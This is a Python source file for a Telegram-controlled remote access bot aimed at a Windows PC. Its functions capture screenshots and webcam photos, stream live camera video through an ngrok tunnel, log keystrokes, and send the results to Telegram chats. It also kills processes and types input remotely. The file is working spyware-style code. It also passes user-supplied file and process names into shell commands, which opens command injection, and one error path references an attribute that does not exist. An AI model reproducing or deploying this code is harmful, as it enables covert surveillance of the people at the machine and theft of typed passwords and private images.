import live_webserver as lw
import os
from telepot.loop import MessageLoop
from dotenv import load_dotenv
import telepot
import secrets
import pyscreenshot
import json
from subprocess import run, Popen,PIPE
from urllib import request as open_web
import time
import datetime
import cv2
from logger import Listener,key_handeler   
import requests
from pynput.keyboard import Controller as key
import speech_recognition as sr
import pyttsx3
from pyngrok import ngrok
class features:
    def __init__(self ,telegram_bot):
        load_dotenv()
        self.admin_chat_id = os.getenv("ADMIN_CHAT_ID")  # chat_id of admin in int form
        self.api_key = os.getenv("API_KEY")
        self.admin_name = os.getenv("ADMIN_NAME")
        self.ngrok_token = os.getenv("NGROK_TOKEN")
        self.chat_id_file = 0
        self.photo_name='photo.png'
        self.authorzed_Users='authorzed_Users/authorzed_Users.json'
        self.key_log_file="KeyLoger.txt"
        self.fin = ''
        self.random_f = ''
        self.fname = ''
        self.fileMessageId = ''
        self.video_therad_state=''
        self.random = 1
        self.now = datetime.datetime.now()
        self.authorized = 0
        self.aut_chat_id = 0
        self.pending = 0
        self.logging = False
        self.logger = 0
        self.telegram_bot = telegram_bot
        file_found = False
        while not file_found:
            try:
                with open(self.authorzed_Users) as f:
                    self.auth_list = json.load(f)
                print(self.auth_list)
                file_found = True
            except FileNotFoundError:
                data = {'authorized': [{'chat_id': None, 'Name': None}]}
                with open(features.authorzed_Users, 'w') as f:
                    json.dump(data, f, indent=2)

    def test_message(self):
        i = 2
        while (i > 0):
            messag = Popen('ipconfig', shell=True, stdout=PIPE,
                        text=True).communicate()[0]
            self.telegram_bot.sendMessage(self.admin_chat_id, messag)
            i = i - 1
    
    def send(self,fp ,chat_id):
        self.telegram_bot.sendDocument(chat_id, open(fp, 'rb'))

    def live_video(self,chat_id,first_name ,last_name):
    
        if self.video_therad_state=="ON":
            lw.stop_server()
            ngrok.kill()
            self.telegram_bot.sendMessage(chat_id,"video feed ended")
            self.video_therad_state=""
        else:
            lw.start_server()
            tunnel=ngrok.connect(5000,'http')
            public_url= str(tunnel).split('''"''')[1]
            self.telegram_bot.sendMessage(chat_id,f'''for live video feed vist 
{public_url}''')
            if not(str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)): 
                self.telegram_bot.sendMessage(self.admin_chat_id,f'''live video feed started by {first_name} {last_name} vist 
{public_url}''')
            self.video_therad_state="ON"
    def download_file(self,msg, key):
        key_list = ["text", "voice", "photo", "video", "document"]
        chat_id = msg['chat']['id']
        self.fileMessageId = msg['message_id']
        print(self.fileMessageId)
        self.chat_id_file = chat_id
        authorized = False
        if self.pending == 0 or chat_id != self.aut_chat_id:
            for i in self.auth_list['authorized']:
                if i['chat_id'] == chat_id:
                    authorized = True
                    break
        if authorized:
            if key == key_list[4]:
                fname = msg[key]["file_name"]
            if key == "photo":
                fid = msg[key][3]["file_id"]
            else:
                fid = msg[key]["file_id"]
            resp = requests.get(
                url=f"https://api.telegram.org/bot{self.api_key}/getFile?file_id={fid}")
            resp = resp.json()
            fp = resp["result"]["file_path"]
            if key != key_list[4]:
                fname = fp[fp.index('/')+1:]
            self.fin = requests.get(
                url=f"https://api.telegram.org/file/bot{self.api_key}/{fp}", allow_redirects=True)
            speach_recon=False
            if not(str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
                if fname.endswith(".oga"):
                    with open(f'downloads/{fname}', "wb") as f:
                        f.write(self.fin.content)  
                    speach_recon,text=self.recognise_speech_and_do(chat_id,fname)
                    return speach_recon,text
                else:
                    print(self.admin_chat_id)
                    random_f = str(secrets.token_hex(32)).upper()
                    self.telegram_bot.sendMessage(
                        chat_id, f'{self.admin_name} will tell you the authorization code')
                    self.telegram_bot.sendMessage(
                        self.admin_chat_id, f"do you want to recive {key} send a key to { msg['chat']['first_name']} {msg['chat']['last_name']} of ")
                    self.telegram_bot.sendMessage(self.admin_chat_id, random_f)
            else:
                text=''
                with open(f'downloads/{fname}', "wb") as f:
                    f.write(self.fin.content)    
                if fname.endswith(".oga"):
                    speach_recon,text=self.recognise_speech_and_do(chat_id,fname)  
                    
                self.chat_id_file = 0
                self.fin = ""
                self.telegram_bot.sendMessage(chat_id, f'file saved as {fname}')
                fname = ""
                
                self.fileMessageId = "aa"
                return speach_recon,text

    def recognise_speech_and_do(self,chat_id,fname):
        
        convert_command=f'C:/tweakes/bin/ffmpeg -y -i downloads/{fname} downloads/{fname}.wav'
        print(convert_command)
        message = Popen(convert_command, shell=True,
                            stdout=PIPE, text=True).communicate()[0]
        text=""
        print(message)
        speach=sr.Recognizer() 
        try:
            with sr.AudioFile(f"downloads/{fname}.wav") as source:
                # listen for the data (load audio to memory)
                audio_data = speach.record(source)
                # recognize (convert from speech to text)
                text = speach.recognize_google(audio_data)
        except sr.UnknownValueError:
            self.telegram_bot.sendMessage(chat_id,f"Didn't get what you said")
            
            os.remove(f"downloads/{fname}.wav")
            os.remove(f"downloads/{fname}")
            print('deleted')
            return
        os.remove(f"downloads/{fname}.wav")
        os.remove(f"downloads/{fname}")
        print('deleted')
        print(text)
        self.telegram_bot.sendMessage(chat_id,f'you said {text}')
        self.chat_id_file = 0
        self.fin = ""
        fname = ""
        self.fileMessageId = "aa"
        return True,text
    def speak(self ,command):
        speak = pyttsx3.init()
        list_command= command.split()
        x = len(list_command[0])
        speak.say(command[x:])
        speak.runAndWait()
    def save_file_in_fin(self,chat_id,fname):
        with open(f'downloads/{fname}', "wb") as f:
            f.write(self.fin.content)
        self.chat_id_file = 0
        self.fin = ""
        self.telegram_bot.sendMessage(chat_id, f'file saved as {fname}')
        fname = ""
        fileMessageId = "aa"
    def take_screenshot(self ,chat_id):
        print("scr")
        img = pyscreenshot.grab()
        img.save('screen.png')
        self.telegram_bot.sendPhoto(chat_id, photo=open("screen.png", 'rb'))
        os.remove("screen.png")
    def kill_task(self, chat_id,list_command):
        command = f'''Taskkill /f /Im "{list_command[1]}.exe" /t'''
        if len(list_command) == 2:
            message = Popen(command, shell=True,
                            stdout=PIPE, text=True).communicate()[0]
        else:
            message = 'Invalid command'
        self.telegram_bot.sendMessage(chat_id, message)
    def keyboard_type(self,command):
        keyboard = key()
        list_command= command.split()
        x = len(list_command[0])
        keyboard.type(command[x+1:])
    def take_photo(self ,chat_id):
        vod = cv2.VideoCapture(0)
        d, img = vod.read()
        vod.release()
        cv2.imwrite(self.photo_name, img)
        self.telegram_bot.sendPhoto(chat_id, photo=open(self.photo_name, 'rb'))
        os.remove(self.photo_name)
    def key_logger(self,chat_id):
        if not self.logging:
            self.logger = Listener(on_press=key_handeler)
            self.logger.start()
            self.telegram_bot.sendMessage(chat_id, "Key logger stared")
            self.logging = True
        else:
            self.logger.stop()
            self.telegram_bot.sendMessage(chat_id, "Key logger stopped")
            self.telegram_bot.sendDocument(
                chat_id, document=open(self.key_log_file, "rb"))
            x = open(self.key_log_file, "w")
            x.close()
            os.remove(self.key_log_file)
            self.logging = False
    def send_first_auth_code(self,chat_id,name):
        self.random = str(secrets.token_hex(6)).upper()
        print(self.random, type(self.random))

        self.telegram_bot.sendMessage(self.admin_chat_id, self.random)
        self.telegram_bot.sendMessage(self.admin_chat_id, str(
            'do you want to authorize ' + name))

        self.telegram_bot.sendMessage(
            chat_id, f'you are not a authorized user please contact {self.admin_name}')
        self.telegram_bot.sendMessage(
            chat_id, 'He will tell you the authorization code')
        self.aut_chat_id = chat_id
        self.pending = 1
        print(self.pending, self.aut_chat_id)
    def receive_auth_code(self,name ,chat_id,command):
        print(self.random)
        if command == self.random:
            self.telegram_bot.sendMessage(
                chat_id, str('you are authorized ' + name))
            new_guy = {'chat_id': chat_id, 'Name': name}
            print(new_guy)
            self.auth_list['authorized'].append(new_guy)
            print(self.auth_list)
            self.pending = 0
            with open(self.authorzed_Users, 'w') as f:
                json.dump(self.auth_list, f, indent=2)
                f.close()
        else:
            self.telegram_bot.sendMessage(chat_id, 'sorry invalid code')
